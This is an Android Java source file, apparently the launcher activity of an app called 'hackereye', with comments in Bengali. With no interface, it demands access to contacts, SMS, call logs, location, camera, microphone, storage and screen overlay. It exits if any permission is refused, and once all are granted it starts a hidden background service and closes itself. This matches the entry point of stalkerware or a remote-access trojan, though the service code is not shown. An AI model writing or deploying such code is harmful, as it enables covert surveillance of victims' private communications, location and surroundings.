package com.hackereye;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    // প্রয়োজনীয় পারমিশন লিস্ট
    private final String[] PERMISSIONS = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.POST_NOTIFICATIONS
    };

    // ওভারলে পারমিশন স্ট্যাটাস ট্র্যাক করার জন্য
    private boolean isOverlayGranted = false;

    // পারমিশন রিকোয়েস্ট লঞ্চার
    private final ActivityResultLauncher<String[]> permissionLauncher =
        registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
            boolean allGranted = true;
            for (Boolean granted : result.values()) {
                if (!granted) { 
                    allGranted = false; 
                    break; 
                }
            }
            
            if (allGranted && isOverlayGranted) {
                startBackgroundService();
            } else if (!allGranted) {
                Toast.makeText(this, "All permissions are required", Toast.LENGTH_LONG).show();
                finish();
            } else {
                // যদি ওভারল পারমিশন এখনো নাও থাকে, তবে কিছু করবেন না
            }
        });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // UI লোড করার প্রয়োজন নেই, সরাসরি লজিক চালাই
        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        // ১. প্রথমে চেক করুন ওভারলে পারমিশন (Android 6.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                isOverlayGranted = false;
                // ওভারল পারমিশনের জন্য সেটিংসে পাঠান
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                    android.net.Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                return; // ওভারল পারমিশন না থাকলে অন্য পারমিশন চাইবেন না
            } else {
                isOverlayGranted = true;
            }
        } else {
            // এন্ড্রয়েড 6.0 এর নিচে ওভারল পারমিশন প্রয়োজন নেই
            isOverlayGranted = true;
        }

        // ২. ওভারল পারমিশন আছে, এখন রানটাইম পারমিশন চেক করুন
        boolean allGranted = true;
        for (String perm : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            startBackgroundService();
        } else {
            // পারমিশন চাওয়া হচ্ছে
            permissionLauncher.launch(PERMISSIONS);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // যদি ইউজার ওভারল পারমিশন সেটিংস থেকে ফিরে আসে, তবে আবার চেক করুন
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.canDrawOverlays(this)) {
                isOverlayGranted = true;
            }
        }
        checkAndRequestPermissions();
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        // অ্যাপ বন্ধ করে দিন যাতে ব্যাকগ্রাউন্ডে চলে যায়
        finish(); 
    }
}
